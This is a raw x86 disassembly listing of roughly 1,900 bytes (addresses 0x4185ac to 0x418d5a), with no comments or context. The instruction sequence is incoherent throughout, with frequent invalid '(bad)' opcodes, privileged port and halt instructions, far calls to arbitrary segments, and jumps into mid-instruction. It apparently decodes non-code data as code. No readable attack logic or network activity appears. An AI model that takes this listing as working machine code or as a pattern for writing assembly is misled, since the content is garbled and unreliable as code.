  4185ac:	jl     0x4185d0
  4185ae:	mov    eax,ds:0x8f03f3
  4185b3:	sbb    eax,eax
  4185b5:	or     eax,0xec5de15b
  4185ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185bb:	lods   al,BYTE PTR ds:[esi]
  4185bc:	sub    ebx,DWORD PTR [ecx-0x41]
  4185bf:	and    edx,DWORD PTR [eax]
  4185c1:	hlt    
  4185c2:	cli    
  4185c3:	dec    eax
  4185c4:	mov    ebp,DWORD PTR [ebx-0x3eb46543]
  4185ca:	fild   WORD PTR [ebx-0x78920605]
  4185d0:	rcl    BYTE PTR ds:0xba3f0a8a,cl
  4185d6:	mov    esp,DWORD PTR [ebx]
  4185d8:	dec    ebp
  4185d9:	scas   al,BYTE PTR es:[edi]
  4185da:	mov    al,ds:0xa0de07ff
  4185df:	call   0x8de8:0x38e9550e
  4185e6:	mov    dl,0x0
  4185e8:	(bad)  
  4185e9:	fsubp  st(2),st
  4185eb:	jp     0x41859f
  4185ed:	stos   BYTE PTR es:[edi],al
  4185ee:	sub    al,0xeb
  4185f0:	pop    edx
  4185f1:	mov    edi,0x8189bf9f
  4185f6:	lods   al,BYTE PTR ds:[esi]
  4185f7:	pop    ecx
  4185f8:	cmc    
  4185f9:	and    ecx,0x4cde7080
  4185ff:	mov    al,0xa
  418601:	outs   dx,BYTE PTR ds:[esi]
  418602:	(bad)  
  418603:	cld    
  418604:	push   ebp
  418605:	add    ecx,esp
  418607:	push   esi
  418608:	mov    ?,WORD PTR gs:[ebx]
  41860b:	aaa    
  41860c:	dec    eax
  41860d:	add    al,0x8b
  41860f:	clc    
  418610:	call   0x2ce1f75a
  418615:	mov    bh,ch
  418617:	xchg   esi,eax
  418618:	nop
  418619:	imul   ecx,DWORD PTR [esi-0x56],0xffffffe9
  41861d:	aaa    
  41861e:	(bad)  
  41861f:	fist   DWORD PTR [ecx+edi*4+0x5f]
  418623:	in     al,dx
  418624:	jne    0x418669
  418626:	sbb    esp,DWORD PTR [edx-0x6c]
  418629:	cmp    dl,BYTE PTR [ebx]
  41862b:	icebp  
  41862c:	adc    eax,0x3d5f5321
  418631:	cmp    al,BYTE PTR [ecx+eax*2]
  418634:	sbb    BYTE PTR [edx+0x46],bh
  418637:	in     al,dx
  418638:	das    
  418639:	ret    
  41863a:	mov    eax,ds:0x9a0837c6
  41863f:	popf   
  418640:	jecxz  0x41861c
  418642:	sbb    al,0x24
  418644:	in     eax,0x7f
  418646:	call   0x1267386a
  41864b:	int3   
  41864c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41864d:	mov    esp,0x5388dfd6
  418652:	or     bh,BYTE PTR [ecx-0x7]
  418655:	dec    esi
  418656:	nop
  418657:	add    DWORD PTR [edx-0x70d87b08],esp
  41865d:	fmul   st,st(6)
  41865f:	call   0xd0172ab1
  418664:	adc    al,0xb3
  418666:	in     al,0x6d
  418668:	ret    0xa143
  41866b:	push   ds
  41866c:	out    dx,eax
  41866d:	cmp    DWORD PTR [esi-0x33],edi
  418670:	cmc    
  418671:	push   esi
  418672:	mov    ah,0x59
  418674:	adc    eax,0x1981bfaf
  418679:	mov    DWORD PTR [esp+edx*1+0x1a],eax
  41867d:	inc    ebp
  41867e:	push   ebx
  41867f:	fild   WORD PTR [edi-0x3a]
  418682:	aaa    
  418683:	mov    ds:0xeb7cd0a3,al
  418688:	mov    edx,0x718859e8
  41868d:	loop   0x41864a
  41868f:	add    al,0x8d
  418691:	push   cs
  418692:	out    dx,al
  418693:	mov    ds:0x10acebc8,eax
  418698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418699:	aas    
  41869a:	cmp    al,0x10
  41869c:	pop    ds
  41869d:	ffreep st(0)
  41869f:	stos   DWORD PTR es:[edi],eax
  4186a0:	in     eax,0x5
  4186a2:	jp     0x4186da
  4186a4:	ds mov dl,0xe0
  4186a7:	sub    dl,bl
  4186a9:	rcr    ah,cl
  4186ab:	stos   DWORD PTR es:[edi],eax
  4186ac:	dec    edx
  4186ad:	cli    
  4186ae:	jp     0x418641
  4186b0:	push   edi
  4186b1:	inc    ebx
  4186b2:	fadd   st,st(5)
  4186b4:	fidiv  DWORD PTR [ebp+0x27]
  4186b7:	mov    esp,0x1bc3f667
  4186bc:	repz js 0x4186f9
  4186bf:	mov    bh,0x23
  4186c1:	pop    edi
  4186c2:	lock daa 
  4186c4:	jecxz  0x4186a3
  4186c6:	mov    ch,0x31
  4186c8:	and    al,BYTE PTR [eax+0x79]
  4186cb:	inc    edx
  4186cd:	jle    0x418686
  4186cf:	lahf   
  4186d0:	mov    esi,0x6170b58f
  4186d5:	scas   al,BYTE PTR es:[edi]
  4186d6:	cld    
  4186d7:	push   ebp
  4186d8:	in     al,dx
  4186d9:	jnp    0x4186d4
  4186db:	pushf  
  4186dc:	sub    eax,0x2045e946
  4186e1:	cmc    
  4186e2:	xor    BYTE PTR [edi+0x16],ch
  4186e5:	fisubr DWORD PTR [eax]
  4186e7:	pop    ds
  4186e8:	sbb    esi,DWORD PTR [edx]
  4186ea:	mov    esp,0x986de6eb
  4186ef:	pop    ecx
  4186f0:	add    DWORD PTR [ecx-0x17],eax
  4186f3:	ja     0x418717
  4186f5:	inc    esi
  4186f6:	test   al,0x73
  4186f8:	mov    ebp,0x8bd3e6a5
  4186fd:	inc    ebx
  4186fe:	dec    esi
  4186ff:	test   al,0x1f
  418701:	or     BYTE PTR [edx],bl
  418703:	hlt    
  418704:	add    edi,DWORD PTR [edi+ebp*2]
  418707:	sbb    BYTE PTR [ecx+0x40],dl
  41870a:	sbb    al,0x71
  41870c:	or     eax,0xfa23c97f
  418711:	and    BYTE PTR [ebx+ebx*2],0x12
  418715:	jge    0x418774
  418717:	jmp    0x418766
  418719:	pop    es
  41871a:	mov    bh,0x73
  41871c:	xchg   ebx,eax
  41871d:	sub    dl,BYTE PTR [ebx+0x2ebd673a]
  418723:	stos   BYTE PTR es:[edi],al
  418724:	inc    edi
  418725:	inc    ecx
  418726:	lahf   
  418727:	mov    ecx,0x409b0b6a
  41872c:	xchg   edi,eax
  41872d:	inc    edx
  41872e:	pop    edx
  41872f:	out    dx,eax
  418730:	pop    ecx
  418731:	mov    al,0xe3
  418733:	fistp  DWORD PTR [esi-0x5e]
  418736:	mov    ebx,0x2cfed5c2
  41873b:	out    dx,eax
  41873c:	push   esi
  41873d:	sub    eax,0xfe8026ac
  418742:	call   0xf99a:0xb664bdc6
  418749:	icebp  
  41874a:	shl    esp,1
  41874c:	ins    DWORD PTR es:[edi],dx
  41874d:	inc    edx
  41874e:	sbb    eax,0x38f2702
  418753:	lods   eax,DWORD PTR ds:[esi]
  418754:	ret    
  418755:	aad    0xa4
  418757:	inc    esi
  418758:	retf   0xbc1
  41875b:	inc    esi
  41875c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41875d:	and    bp,WORD PTR [ebx]
  418760:	xor    esi,DWORD PTR [ebx]
  418762:	test   al,bl
  418764:	clc    
  418765:	test   DWORD PTR [esi-0x56],eax
  418768:	aam    0x99
  41876a:	cld    
  41876b:	sub    ebp,0xfac23c93
  418771:	cwde   
  418772:	xor    al,0x93
  418774:	shl    DWORD PTR [edi],cl
  418776:	aaa    
  418777:	inc    edi
  418778:	cmp    al,0x1
  41877a:	inc    BYTE PTR [edx-0x12]
  41877d:	rcl    BYTE PTR [ebp-0x1be76d0a],1
  418783:	test   BYTE PTR [ebp-0x2a4f4a4f],bl
  418789:	dec    eax
  41878a:	mov    bh,0x29
  41878c:	out    0xa2,al
  41878e:	sbb    BYTE PTR [edi+eiz*1-0x362aa88],dl
  418795:	sub    edi,ecx
  418797:	fcomp  st(6)
  418799:	pop    edx
  41879a:	add    bh,0x62
  41879d:	jne    0x418799
  41879f:	and    ebp,DWORD PTR [ebx]
  4187a1:	inc    ebp
  4187a2:	mov    edi,gs
  4187a4:	ret    0x9d49
  4187a7:	jmp    0xdf8b8bc8
  4187ac:	scas   al,BYTE PTR es:[edi]
  4187ad:	sbb    ebp,DWORD PTR [ecx]
  4187af:	fnstsw WORD PTR [esi+eax*8+0x19]
  4187b3:	and    al,0x96
  4187b5:	pop    ecx
  4187b6:	iret   
  4187b7:	xchg   edi,eax
  4187b8:	cmp    BYTE PTR [edx-0x76e673fe],0x3b
  4187bf:	std    
  4187c0:	int    0xfe
  4187c2:	dec    esp
  4187c3:	lea    esp,[eax-0x6b0a8081]
  4187c9:	push   es
  4187ca:	ins    DWORD PTR es:[edi],dx
  4187cb:	jg     0x4187e1
  4187cd:	push   eax
  4187ce:	or     ebx,DWORD PTR [edi]
  4187d0:	imul   esp,DWORD PTR [edx+0x29],0xffffffb0
  4187d4:	mov    DWORD PTR [ebx],esi
  4187d6:	xchg   DWORD PTR [edi-0x1dd74bbb],edi
  4187dc:	xor    BYTE PTR [esi-0x18bb21eb],bh
  4187e2:	push   esp
  4187e3:	push   ebp
  4187e4:	ds fs pop esp
  4187e7:	xchg   edi,eax
  4187e8:	sbb    eax,0x1ec63766
  4187ed:	xchg   esi,eax
  4187ee:	adc    edx,ebp
  4187f0:	add    BYTE PTR ds:0x69592b86,ch
  4187f6:	iret   
  4187f7:	and    BYTE PTR [ebp-0x524c02ce],ch
  4187fd:	xchg   DWORD PTR [edx+ecx*4+0x1323c27d],edi
  418804:	clc    
  418805:	push   es
  418806:	mov    bh,0x74
  418808:	leave  
  418809:	jb     0x418848
  41880b:	scas   al,BYTE PTR es:[edi]
  41880c:	iret   
  41880d:	push   cs
  41880e:	shl    DWORD PTR [edi+0x59038745],cl
  418814:	xor    DWORD PTR [ecx+0x4f80c933],0x6
  41881b:	out    0xa4,eax
  41881d:	scas   al,BYTE PTR es:[edi]
  41881e:	rcr    BYTE PTR [eax+0x13ae1b17],1
  418824:	cmp    cl,BYTE PTR [edi+0x3b]
  418827:	mov    ebp,0x44c10e4e
  41882c:	mov    esp,DWORD PTR [ebx]
  41882e:	(bad)  
  41882f:	enter  0x60ad,0x7f
  418833:	xchg   ebp,eax
  418834:	xchg   ecx,eax
  418835:	mov    ds:0xb817d333,eax
  41883a:	pop    esp
  41883b:	mov    bl,0xb
  41883d:	push   edi
  41883e:	lock jne 0x41885e
  418841:	cmp    DWORD PTR [edx+0x42],0x157ef70b
  418848:	fcmovbe st,st(3)
  41884a:	out    0x57,al
  41884c:	call   0x7f79:0x9849685
  418853:	mov    ebx,0xb523f900
  418858:	hlt    
  418859:	lods   al,BYTE PTR ds:[esi]
  41885a:	sub    esp,edx
  41885c:	add    eax,0x41fcea80
  418861:	mov    edi,0xd4cdf4eb
  418866:	aas    
  418867:	cmp    BYTE PTR [ebx-0x77],cl
  41886a:	fsubr  st(6),st
  41886c:	mov    esi,DWORD PTR [ecx+0x37ba2be1]
  418872:	aam    0xa7
  418874:	inc    ebx
  418875:	into   
  418876:	or     BYTE PTR [ecx+0x194ff4f9],0x34
  41887d:	aaa    
  41887e:	in     al,dx
  41887f:	jne    0x418815
  418881:	daa    
  418882:	mov    cl,0x11
  418884:	clc    
  418885:	and    eax,0x73f942f4
  41888a:	sub    BYTE PTR [ecx],ah
  41888c:	sub    ecx,eax
  41888e:	push   ds
  41888f:	mov    WORD PTR [ecx+ebx*2-0x1],es
  418893:	or     dh,al
  418895:	mov    bh,0xd3
  418897:	inc    eax
  418898:	(bad)  
  418899:	dec    esi
  41889a:	cdq    
  41889b:	push   cs
  41889c:	mov    edx,0x93e5aa17
  4188a1:	ss mov al,0x65
  4188a4:	cs iret 
  4188a6:	cmc    
  4188a7:	lods   eax,DWORD PTR ds:[esi]
  4188a8:	clc    
  4188a9:	jmp    0xdb95569c
  4188ae:	jge    0x418844
  4188b0:	(bad)  
  4188b1:	pusha  
  4188b2:	sub    ecx,DWORD PTR [edi+0x1d21bee7]
  4188b8:	lods   al,BYTE PTR ds:[esi]
  4188b9:	xchg   esi,eax
  4188ba:	ja     0x418853
  4188bc:	or     ebx,DWORD PTR [ebx-0x71dec151]
  4188c2:	stc    
  4188c3:	les    ebp,FWORD PTR [eax]
  4188c5:	add    esp,ecx
  4188c7:	cdq    
  4188c8:	jl     0x41890f
  4188ca:	mov    al,ds:0xba5b622f
  4188cf:	out    0xa0,eax
  4188d1:	jbe    0x41888f
  4188d3:	enter  0xed67,0xa0
  4188d7:	fild   DWORD PTR [ebp-0x5b30c5cd]
  4188dd:	imul   ebx,DWORD PTR [ecx+0x2],0x97306545
  4188e4:	stc    
  4188e5:	mov    ebx,0xcec9215b
  4188ea:	add    BYTE PTR [edx+edi*2-0x2],dh
  4188ee:	jl     0x4188cd
  4188f0:	pop    es
  4188f1:	in     al,dx
  4188f2:	mov    ah,0x3f
  4188f4:	std    
  4188f5:	xor    ah,ah
  4188f7:	and    BYTE PTR [ebx+edi*4-0x74821a71],ch
  4188fe:	push   ebx
  4188ff:	in     eax,0xdb
  418901:	(bad)  
  418903:	and    BYTE PTR [esp+esi*4],0x84
  418907:	dec    eax
  418908:	aas    
  418909:	push   esp
  41890a:	pop    ebx
  41890b:	mov    esi,0xdab15739
  418910:	retf   0x77df
  418913:	xchg   BYTE PTR [ecx-0x31b79c7e],dh
  418919:	sbb    eax,0x870e1e4
  41891e:	push   edx
  41891f:	sbb    cl,BYTE PTR [edx+eiz*2+0x41]
  418923:	sbb    DWORD PTR [eax],esp
  418925:	test   al,0xf3
  418927:	stos   DWORD PTR es:[edi],eax
  418928:	cld    
  418929:	aam    0x9a
  41892b:	mov    al,ds:0xe1bfa86e
  418930:	mov    al,0xef
  418932:	je     0x418956
  418934:	and    dh,BYTE PTR [edx-0x66245776]
  41893a:	cs jae 0x4189b6
  41893d:	sub    edx,DWORD PTR [edx+0x31]
  418940:	lods   al,BYTE PTR ds:[esi]
  418941:	sub    al,0x76
  418943:	cdq    
  418944:	retf   
  418945:	fbld   TBYTE PTR [ebx]
  418947:	mov    al,ds:0xce458f7c
  41894c:	jae    0x41899c
  41894e:	pop    edx
  41894f:	mov    al,ds:0x66d13b99
  418954:	ins    BYTE PTR es:[edi],dx
  418955:	push   cs
  418956:	sbb    BYTE PTR [eax-0x14049c19],cl
  41895c:	test   BYTE PTR [edx],bh
  41895e:	mov    ecx,0xbf68b861
  418963:	hlt    
  418964:	jo     0x418912
  418966:	xlat   BYTE PTR ds:[ebx]
  418967:	xlat   BYTE PTR ds:[ebx]
  418968:	retf   0x8ec4
  41896b:	add    ch,BYTE PTR [esi]
  41896d:	cmp    edx,DWORD PTR [ebp-0x27]
  418970:	out    0xbc,al
  418972:	aad    0xed
  418974:	jbe    0x418964
  418976:	inc    BYTE PTR [ecx+0x78c1d77f]
  41897c:	or     ebx,DWORD PTR [esi-0x32]
  41897f:	mov    bl,BYTE PTR [eax]
  418981:	hlt    
  418982:	das    
  418983:	adc    BYTE PTR [ebp-0x58],bl
  418986:	stc    
  418987:	loop   0x418972
  418989:	adc    DWORD PTR [edx+edx*4-0x2a],0x68
  41898e:	sar    BYTE PTR ds:[edx-0x1be9162a],cl
  418995:	inc    edi
  418996:	pop    ds
  418997:	(bad)  
  418999:	bound  ebp,QWORD PTR [eax]
  41899b:	ret    0x3b55
  41899e:	stos   BYTE PTR es:[edi],al
  41899f:	cld    
  4189a0:	xchg   esi,eax
  4189a1:	mov    ch,0x1d
  4189a3:	xor    eax,0x17d19fa4
  4189a8:	pop    ss
  4189a9:	pop    ds
  4189aa:	stc    
  4189ab:	inc    esp
  4189ac:	jns    0x418a26
  4189ae:	ret    0xcb34
  4189b1:	dec    edx
  4189b2:	mov    dh,BYTE PTR [ebx+0x2e1a4403]
  4189b8:	mov    al,0x95
  4189ba:	int3   
  4189bb:	mov    gs,WORD PTR [edx]
  4189bd:	pop    ss
  4189be:	jg     0x418a20
  4189c0:	mov    ecx,0xf29db656
  4189c5:	add    DWORD PTR [ebx*1-0x30a5bc7],0xffffff9f
  4189cd:	arpl   WORD PTR [eax+edx*2-0x73],ax
  4189d1:	jbe    0x418963
  4189d3:	add    eax,0xaa6aac1c
  4189d8:	push   ebp
  4189d9:	cmp    ebp,DWORD PTR [ebx]
  4189db:	dec    eax
  4189dc:	and    BYTE PTR [ebx+0x6a],al
  4189df:	test   eax,0x7ece9ee1
  4189e4:	push   eax
  4189e5:	xchg   edi,eax
  4189e6:	test   al,0x10
  4189e8:	sbb    BYTE PTR ds:0x2f5e4ebc,bh
  4189ee:	scas   eax,DWORD PTR es:[edi]
  4189ef:	add    BYTE PTR [esi+0x42],al
  4189f2:	rcl    cl,0x46
  4189f5:	fmul   DWORD PTR [edx]
  4189f7:	lods   eax,DWORD PTR ds:[esi]
  4189f8:	icebp  
  4189f9:	jne    0x41899c
  4189fb:	mov    ds:0x88901152,al
  418a00:	inc    eax
  418a01:	pcmpeqw mm4,mm2
  418a04:	data16 (bad) 
  418a06:	push   cs
  418a07:	add    al,0x65
  418a09:	xchg   BYTE PTR ds:0x7ccb5d01,cl
  418a0f:	or     eax,DWORD PTR [ebx-0x4d]
  418a12:	scas   al,BYTE PTR es:[edi]
  418a13:	retf   0x97a8
  418a16:	ror    DWORD PTR [esi],cl
  418a18:	daa    
  418a19:	add    ch,dh
  418a1b:	add    edi,esi
  418a1d:	ret    
  418a1e:	xor    al,0x25
  418a20:	sbb    eax,0x6ff04d36
  418a25:	rcl    BYTE PTR [edi+eax*2],0x2f
  418a29:	hlt    
  418a2a:	push   cs
  418a2b:	mov    esp,0xa722a7c8
  418a30:	and    edx,ebp
  418a32:	pop    es
  418a33:	jg     0x418a5c
  418a35:	scas   al,BYTE PTR es:[edi]
  418a36:	popa   
  418a37:	or     esp,DWORD PTR [ebx+esi*2]
  418a3a:	cdq    
  418a3b:	mov    cx,0x468e
  418a3f:	hlt    
  418a40:	add    BYTE PTR [ebp-0x6d],dl
  418a43:	addr16 push ecx
  418a45:	jns    0x418a66
  418a47:	shl    DWORD PTR [edx],cl
  418a49:	inc    edi
  418a4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a4b:	leave  
  418a4c:	mov    ds:0x33c2b802,al
  418a51:	cmp    ah,BYTE PTR [ebp+0x1779b8f]
  418a57:	call   0x9cc8:0x361fb7e0
  418a5e:	sbb    cl,BYTE PTR fs:[ecx+0x60c1b9b6]
  418a65:	gs push edi
  418a67:	xor    al,0xa1
  418a69:	mov    ds:0x128e32bf,al
  418a6e:	test   DWORD PTR [eax-0x32],eax
  418a71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a72:	cs cld 
  418a74:	repz pop ss
  418a76:	add    BYTE PTR [eax+0x22],bh
  418a79:	lods   al,BYTE PTR ds:[esi]
  418a7a:	fcom   DWORD PTR [edi-0x6f]
  418a7d:	scas   eax,DWORD PTR es:[edi]
  418a7e:	sub    eax,0x2a26fbf4
  418a83:	aaa    
  418a84:	xchg   edi,eax
  418a85:	(bad)  
  418a86:	adc    eax,0x438211dc
  418a8b:	repz cmp al,bh
  418a8e:	inc    edx
  418a8f:	xchg   ebp,eax
  418a90:	fimul  DWORD PTR [ebx+0x22]
  418a93:	aad    0x70
  418a95:	xor    BYTE PTR [edi-0x7fa6cfa8],bl
  418a9b:	loope  0x418b12
  418a9d:	jns    0x418a51
  418a9f:	and    DWORD PTR [ebx],0x7
  418aa2:	icebp  
  418aa3:	rcl    DWORD PTR [eax],cl
  418aa5:	pop    edi
  418aa6:	jnp    0x418aad
  418aa8:	xor    eax,0xa378452d
  418aad:	(bad)  
  418aae:	ins    BYTE PTR es:[edi],dx
  418aaf:	(bad)  
  418ab0:	cmp    eax,0x3bd44ff2
  418ab5:	inc    esp
  418ab6:	add    DWORD PTR [eax],0xff989606
  418abc:	cmp    al,0x42
  418abe:	mov    ebx,0x22822d84
  418ac3:	jecxz  0x418afa
  418ac5:	out    dx,al
  418ac6:	dec    edi
  418ac7:	sub    DWORD PTR [edi-0x2d1b5d7e],ebp
  418acd:	push   esp
  418ace:	inc    edi
  418acf:	int3   
  418ad0:	pop    eax
  418ad1:	mov    ds:0x2644e9fd,eax
  418ad6:	mov    cl,0xcd
  418ad8:	scas   eax,DWORD PTR es:[edi]
  418ad9:	stos   BYTE PTR es:[edi],al
  418ada:	xchg   ebp,eax
  418adb:	sbb    dl,cl
  418add:	shr    BYTE PTR [ebx+0x7c019ad9],cl
  418ae3:	xor    esp,eax
  418ae5:	sbb    al,0x54
  418ae7:	and    eax,0xd34fb6c3
  418aec:	aad    0xdf
  418aee:	adc    BYTE PTR [esi+0x5b],bh
  418af1:	cmp    BYTE PTR ds:0xd7556103,ah
  418af7:	shl    DWORD PTR [eax+0xaf2ecf6],1
  418afd:	and    bl,cl
  418aff:	jo     0x418b56
  418b01:	cmp    cl,dl
  418b03:	daa    
  418b04:	jge    0x418ad5
  418b06:	mov    WORD PTR [eax-0x5e],fs
  418b09:	jo     0x418b4e
  418b0b:	cli    
  418b0c:	pop    es
  418b0d:	push   ss
  418b0e:	push   cs
  418b0f:	push   0x69ddd151
  418b14:	loope  0x418b18
  418b16:	xchg   cx,ax
  418b18:	lods   eax,DWORD PTR ds:[esi]
  418b19:	or     eax,DWORD PTR [edx]
  418b1b:	ficomp WORD PTR [edx+0x5]
  418b1e:	test   al,0x3f
  418b20:	xor    bl,BYTE PTR [esi-0x20]
  418b23:	pop    edx
  418b24:	out    0xbd,eax
  418b26:	add    ebp,DWORD PTR [edi-0x12]
  418b29:	call   0x32ad:0xa9c5c2f7
  418b30:	sbb    DWORD PTR [edi+eax*1],0xb68ed7a8
  418b37:	in     eax,0x33
  418b39:	dec    ebp
  418b3a:	iret   
  418b3b:	mov    al,0xa4
  418b3d:	stos   BYTE PTR es:[edi],al
  418b3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b3f:	or     ebp,DWORD PTR [edi-0x71]
  418b42:	ds rcl esi,cl
  418b45:	fst    DWORD PTR [edx]
  418b47:	mov    edx,DWORD PTR [eax-0xb]
  418b4a:	pop    esp
  418b4b:	test   BYTE PTR [edi-0x59d7cd53],dl
  418b51:	pop    ebp
  418b52:	clc    
  418b53:	pushf  
  418b54:	or     cl,dh
  418b56:	ja     0x418af0
  418b58:	dec    edi
  418b59:	ds adc eax,0xf66da4ef
  418b5f:	pop    edi
  418b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b61:	loope  0x418ae8
  418b63:	mov    al,0xfa
  418b65:	adc    al,0x2e
  418b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b68:	shr    DWORD PTR [eax+0x4da9811f],1
  418b6e:	mov    cl,0x3b
  418b70:	(bad)  
  418b71:	test   eax,0x9b51a7ad
  418b76:	push   ebx
  418b77:	jl     0x418afc
  418b79:	gs mov ebp,0x276da948
  418b7f:	test   DWORD PTR [eax+0x49],ebx
  418b82:	xchg   BYTE PTR [edx+ebp*2-0x4972d083],bl
  418b89:	int    0x60
  418b8b:	mov    al,ds:0x4e7e9423
  418b90:	lds    eax,FWORD PTR [ecx-0x84b6c8a]
  418b96:	push   esp
  418b97:	mov    esp,esp
  418b99:	retf   0xc1b8
  418b9c:	dec    edi
  418b9d:	mov    ch,0x5b
  418b9f:	aam    0x28
  418ba1:	scas   al,BYTE PTR es:[edi]
  418ba2:	fndisi(8087 only) 
  418ba4:	inc    esp
  418ba5:	and    eax,0xd72ee217
  418baa:	jle    0x418b98
  418bac:	mov    cl,0xc6
  418bae:	mov    ebx,0x3abfbc47
  418bb3:	jp     0x418b55
  418bb5:	rol    DWORD PTR [esi+0x78],0xc8
  418bb9:	inc    esp
  418bba:	jge    0x418be2
  418bbc:	mov    ds:0x15b8ca79,al
  418bc1:	cmp    al,0xd7
  418bc3:	test   eax,0xa98e7eea
  418bc8:	sbb    eax,0x51abbed9
  418bcd:	dec    ecx
  418bce:	daa    
  418bcf:	xor    eax,DWORD PTR [ebx-0x7d]
  418bd2:	xor    DWORD PTR [edx+0x7b19b3ca],esi
  418bd8:	out    0x94,al
  418bda:	pop    edi
  418bdb:	xchg   al,dl
  418bdd:	jle    0x418ba3
  418bdf:	mov    al,0x6a
  418be1:	aaa    
  418be2:	cld    
  418be3:	es mov cl,0x67
  418be6:	jle    0x418bb8
  418be8:	pop    ss
  418be9:	sbb    DWORD PTR [edi-0x1c],ebp
  418bec:	mov    cl,0xf7
  418bee:	(bad)  
  418bef:	jmp    0xab75f059
  418bf4:	adc    al,0x4
  418bf6:	push   es
  418bf7:	stos   BYTE PTR es:[edi],al
  418bf8:	and    edx,DWORD PTR [edi]
  418bfa:	or     DWORD PTR [ebx+0x2e],esi
  418bfd:	scas   al,BYTE PTR es:[edi]
  418bfe:	cmp    ebx,edi
  418c00:	jecxz  0x418c6b
  418c02:	leave  
  418c03:	test   al,ch
  418c05:	mov    esp,cs
  418c07:	ins    DWORD PTR es:[edi],dx
  418c08:	fst    DWORD PTR [esi+0x2d]
  418c0b:	sbb    bh,BYTE PTR [edx-0x2fe3cc5d]
  418c11:	inc    ecx
  418c12:	jnp    0x418bf1
  418c14:	dec    esi
  418c15:	add    eax,0x1c452778
  418c1a:	leave  
  418c1b:	int    0xf8
  418c1d:	add    DWORD PTR [edx+0xe],edi
  418c20:	xchg   BYTE PTR [ecx+ecx*4-0xc],bh
  418c24:	int    0xd8
  418c26:	pop    esi
  418c27:	(bad)  
  418c28:	sbb    al,0x33
  418c2a:	pop    esp
  418c2b:	fdivrp st(6),st
  418c2d:	push   ebx
  418c2e:	push   cs
  418c2f:	dec    edx
  418c30:	mul    BYTE PTR [esi-0x56]
  418c33:	call   0x51bdd4b3
  418c38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c39:	adc    bl,BYTE PTR ds:0xdfa8e13c
  418c3f:	push   ebp
  418c40:	in     al,0x28
  418c42:	cmp    ah,bh
  418c44:	pop    edx
  418c45:	arpl   dx,sp
  418c47:	(bad)  
  418c48:	xor    BYTE PTR [edx],bl
  418c4a:	add    edx,esp
  418c4c:	sbb    eax,0x23218387
  418c51:	aas    
  418c52:	xor    eax,0x75946470
  418c57:	xor    eax,0xed3add9d
  418c5c:	les    edi,FWORD PTR [edx+0x3b78845d]
  418c62:	pop    edi
  418c63:	ret    
  418c64:	stos   DWORD PTR es:[edi],eax
  418c65:	jno    0x418bf0
  418c67:	lock mov bh,0xd3
  418c6a:	loop   0x418c32
  418c6c:	loopne 0x418c70
  418c6e:	into   
  418c6f:	push   0xffffffb8
  418c71:	sahf   
  418c72:	dec    ecx
  418c73:	inc    esi
  418c74:	inc    ebx
  418c75:	popf   
  418c76:	or     DWORD PTR [ebx+0x2b9aec2],0xffffffaf
  418c7d:	fimul  WORD PTR [eax+edi*4]
  418c80:	je     0x418caa
  418c82:	fwait
  418c83:	xor    DWORD PTR [ecx],eax
  418c85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c86:	mov    esi,0xef2deb9b
  418c8b:	retf   
  418c8c:	fs mov ebx,0x15fe4417
  418c92:	es mov fs,ebp
  418c95:	pop    edi
  418c96:	out    0x6d,al
  418c98:	sbb    bh,BYTE PTR [edi+0x290115fc]
  418c9e:	je     0x418d15
  418ca0:	jge    0x418d16
  418ca2:	sbb    eax,0xd99d326
  418ca7:	sbb    bh,bh
  418ca9:	fs ret 
  418cab:	push   es
  418cac:	sbb    eax,0x891949c2
  418cb1:	dec    edx
  418cb2:	aad    0xdd
  418cb4:	mov    cs,WORD PTR [edx-0x1ed64751]
  418cba:	(bad)  
  418cbb:	popf   
  418cbc:	dec    ecx
  418cbd:	pop    es
  418cbe:	aad    0xd4
  418cc0:	cmp    eax,0xd24a796b
  418cc5:	push   cs
  418cc6:	xchg   ecx,eax
  418cc7:	or     eax,0x579e040f
  418ccc:	mov    al,0x77
  418cce:	mov    fs,WORD PTR [ebp+0xf2ed08c]
  418cd4:	std    
  418cd5:	jmp    0xc96e:0xf2d942dd
  418cdc:	pop    edx
  418cdd:	cli    
  418cde:	xor    eax,0x6f1e0267
  418ce3:	pop    es
  418ce4:	loope  0x418c73
  418ce6:	jl     0x418d48
  418ce8:	dec    ebp
  418ce9:	push   edx
  418cea:	(bad)  
  418cec:	or     cl,dh
  418cee:	mov    dl,0x82
  418cf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cf1:	inc    esi
  418cf2:	push   esp
  418cf3:	stos   BYTE PTR es:[edi],al
  418cf4:	inc    edi
  418cf5:	mov    esp,0xa91f29ca
  418cfa:	mov    eax,ds:0xaa623c2b
  418cff:	lahf   
  418d00:	jnp    0x418d04
  418d02:	push   0xa9771d7b
  418d07:	jmp    0x418d0c
  418d09:	cmp    ch,bh
  418d0b:	inc    eax
  418d0c:	xchg   esp,eax
  418d0d:	push   eax
  418d0e:	dec    DWORD PTR [ebp-0x3d022714]
  418d14:	add    bl,BYTE PTR [esi-0x9dc1211]
  418d1a:	xlat   BYTE PTR ds:[ebx]
  418d1b:	dec    edx
  418d1c:	or     al,0xa3
  418d1e:	in     al,0xab
  418d20:	pop    eax
  418d21:	sbb    bl,ch
  418d23:	ins    BYTE PTR es:[edi],dx
  418d24:	and    al,BYTE PTR [ecx-0x6b]
  418d27:	ret    0x5d59
  418d2a:	out    0xc,al
  418d2c:	test   al,0xa
  418d2e:	or     edx,DWORD PTR [ecx]
  418d30:	or     DWORD PTR ss:[edi-0x5f6118cf],eax
  418d37:	mov    ecx,0x14e1e6ce
  418d3c:	sub    BYTE PTR [eax+eax*2],0xb
  418d40:	fisttp QWORD PTR [eax+0x37]
  418d43:	retf   0x1a94
  418d46:	test   eax,0x9f50cd62
  418d4c:	sub    DWORD PTR [edx],edx
  418d4e:	xor    DWORD PTR [edi-0x12119af6],ecx
  418d54:	and    dh,BYTE PTR [ecx-0x4017134e]
  418d5a:	push   0xffffffe3
